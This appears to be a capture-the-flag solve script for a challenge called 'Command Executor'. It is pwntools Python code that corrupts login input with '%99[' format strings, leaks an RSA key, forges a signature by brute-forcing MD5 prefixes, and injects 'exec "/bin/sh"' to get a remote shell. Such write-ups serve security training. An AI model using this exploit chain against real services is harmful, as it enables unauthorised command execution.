# Command Executor [RC]

Description: 
Author: _kos0ng

### Cara Solve
```python
#!usr/bin/python3
from pwn import *
from Crypto.PublicKey import RSA

host, port = '103.152.242.68', 10023
# context.log_level = 'debug'

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
pie b 0x1bfd
'''.format(**locals())

def get_valid_ct(e, n):
    valid_results = []
    arr_values = []
    for i in range(2, 2000):
        result = pow(i*4919, e, n)
        tmp = int.to_bytes(result, 500, 'big').strip(b'\x00\x00')
        if tmp[1] == 0:
            valid_results.append(tmp[:2])
            arr_values.append(i)
    return valid_results, arr_values

def get_valid_sign(cmd, valid_results, arr_values):
    for i in range(0x100):
        for j in range(0xff):
            m = hashlib.md5()
            current_test = cmd + int.to_bytes(i, 1, 'big') + int.to_bytes(j, 1, 'big')
            m.update(current_test)
            if m.digest()[:2] in valid_results: 
                return current_test, arr_values[valid_results.index(m.digest()[:2])]

def exploit():
    global r
    r = initialize()
    
    r.recvuntil(b"Username: ")
    r.sendline(b"A")
    r.recvuntil(b"Password: ")
    r.sendline(b"aaaaaaaaaaaaaaaaaaaaaa%99[")
    
    r.recvuntil(b"(yes/no)? ")
    r.sendline(b"no")

    r.recvuntil(b"Username: ")
    r.sendline(b"A")
    r.recvuntil(b"Password: ")
    
    payload = b"b"*48
    payload += b"%99["
    payload += b"b"*(72 - len(payload))
    
    r.sendline(payload)

    r.recvuntil(b"(yes/no)? ")
    r.sendline(b"no")

    r.recvuntil(b"Username: ")
    r.sendline(b"A")
    r.recvuntil(b"Password: ")
    r.send(b"\x01")

    r.recvuntil(b"o"*4)
    public_key = b""
    for i in range(9):
        public_key += r.recvline()
    
    key = RSA.importKey(public_key)
    n = key.n
    e = 65537

    valid_results, arr_values = get_valid_ct(e, n)
    payload, sign = get_valid_sign(b'exec "/bin/sh";#', valid_results, arr_values)
    
    r.recvuntil(b"Username: ")
    r.sendline(b"A")
    r.recvuntil(b"Password: ")
    r.send(b"a\na\\")

    r.recvuntil(b"(yes/no)? ")
    r.sendline(b"yes")

    r.recvuntil(b"code: ")
    r.sendline(payload)

    r.recvuntil(b"signature: ")
    r.sendline(hex(sign)[2:].encode())

    r.interactive()
    
if __name__ == '__main__':
    exploit()
```